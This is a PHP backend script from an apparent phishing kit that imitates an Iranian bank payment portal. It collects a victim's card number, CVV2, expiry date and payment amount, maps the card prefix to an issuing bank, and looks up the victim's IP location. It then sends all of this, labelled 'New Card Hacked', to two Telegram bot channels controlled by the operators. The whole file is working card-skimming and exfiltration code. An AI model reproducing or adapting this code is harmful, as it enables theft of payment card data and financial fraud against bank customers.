<?php


 if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
} 

include "time.php" ;
$e= basename($_POST ["e"]);
include"../data/$e.php";
include"../INFO.php";

$pan = $_POST["cardnumber"];
$cvv = $_POST["cvv2"];
$year = $_POST["year"];
$month = $_POST["month"];
$amount = $_POST["am"];

$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-12);


if ($cardn == "6037 99" || $cardn == "1700 19" || $cardn == "5899 05") {
      $bankname = "#MELI";  
}
elseif ($cardn == "5892 10") {
        $bankname = "#SEPAH";
}
elseif ($cardn == "6276 48" || $cardn == "2071 77") {
        $bankname = "#TOASE_SADERAT";
}
elseif ($cardn == "6279 61") {
        $bankname = "#SANAT_MADAN";
}
elseif ($cardn == "6037 70" || $cardn == "6392 17") {
        $bankname = "#KESHAVARZI";
}
elseif ($cardn == "6280 23") {
        $bankname = "#MASKAN";
}
elseif ($cardn == "6277 60") {
        $bankname = "#POST_BANK";
}
elseif ($cardn == "5029 08") {
        $bankname = "#TOSSE_TAAVN";
}
elseif ($cardn == "6274 12") {
        $bankname = "#EGHTSAD_NOVIN";
}
elseif ($cardn == "6221 06" || $cardn == "6399 94" || $cardn == "6278 84") {
        $bankname = "#PARSIAN";
}
elseif ($cardn == "5022 29" || $cardn == "6393 47") {
        $bankname = "#PASARGAD";
}
elseif ($cardn == "6274 88" || $cardn == "5029 10") {
        $bankname = "#KAR_AFRIN";
}
elseif ($cardn == "6219 86") {
        $bankname = "#SAMAN";
}
elseif ($cardn == "6393 46") {
        $bankname = "#SINA";
}
elseif ($cardn == "6396 07") {
        $bankname = "#SARMAYE";
}
elseif ($cardn == "6362 14") {
        $bankname = "#AYAND3";
}
elseif ($cardn == "5028 06" || $cardn == "5047 06") {
        $bankname = "#SHAHR";
}
elseif ($cardn == "5029 38") {
        $bankname = "#DEY";
}
elseif ($cardn == "6037 69") {
        $bankname = "#SADERAT";
}
elseif ($cardn == "6104 33" || $cardn == "9919 75") {
        $bankname = "#MELAT";
}
elseif ($cardn == "6273 53" || $cardn == "5859 83") {
        $bankname = "#TEJARAT";
}
elseif ($cardn == "5894 63") {
        $bankname = "#REFAH";
}
elseif ($cardn == "6273 81") {
        $bankname = "#ANSAR";
}
elseif ($cardn == "5057 85") {
        $bankname = "#IRAN_ZAMIN";
}
elseif ($cardn == "6367 95") {
        $bankname = "#MARKAZI";
}
elseif ($cardn == "6369 49") {
        $bankname = "#HEKMAT";
}
elseif ($cardn == "5054 16") {
        $bankname = "#GARDESHGARI";
}
elseif ($cardn == "6063 73") {
        $bankname = "#QARZOLHASANE";
}
elseif ($cardn == "6281 57") {
        $bankname = "#MOSSE_ETBARI";
}
elseif ($cardn == "5058 01") {
        $bankname = "#KOSAR";
}
elseif ($cardn == "6393 70") {
        $bankname = "#MOSSE_MEHR";
}
elseif ($cardn == "6395 99") { 
        $bankname = "#GAVAMIN";
}
else{
        $bankname = "#TEST";
}

$ip = $_SERVER['REMOTE_ADDR'];
$Get_Ip = json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$lat = $Get_Ip->lat;
$lon = $Get_Ip->lon;
$isp = $Get_Ip->isp;
$regionName = $Get_Ip->regionName;
$region = $Get_Ip->region;


$Text = "
New Card Hacked 😍
➖➖➖➖➖➖➖➖➖
🏦вǞПκ: $bankname
🔥𝙲𝙰𝚁𝙳: <code>$pan</code>
🌩𝙾𝚃𝙿 : Waiting.... 
🔱𝙲𝚟𝚟𝟤: <code>$cvv</code>
🔱𝚢𝚎𝚊𝚛: <code>$year</code> Month: <code>$month</code>
🌐𝙸𝙿: <code>$ip</code>
⏰𝚃𝙸𝙼𝙴: $saat
📝𝚃𝙾𝙳𝙰𝚈: $roz
📌𝙳𝙰𝚃𝙴: $tarikh
💴𝙰𝙼𝙾𝚄𝙽𝚃 : $amount 𝗥𝗶𝗮𝗹𝘀
✨ 𝙿𝙾𝚁𝚃𝙰𝙻 : 𝙼𝙴𝙻𝙻𝙰𝚃
   ➖➖➖➖➖➖➖➖➖
   Code By : @SunPhish
   Channel : @anabel_phishing
   Channel : @Panda_Phish

| IP : $ip | ISP : $isp | REGION NAME : $regionName | REGION : $region |
";
  $ok= 
 file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($Text));
 file_get_contents("https://api.telegram.org/bot".$TOKENS."/sendMessage?parse_mode=HTML&chat_id=".$IDS."&text=".urlencode($Text));
?>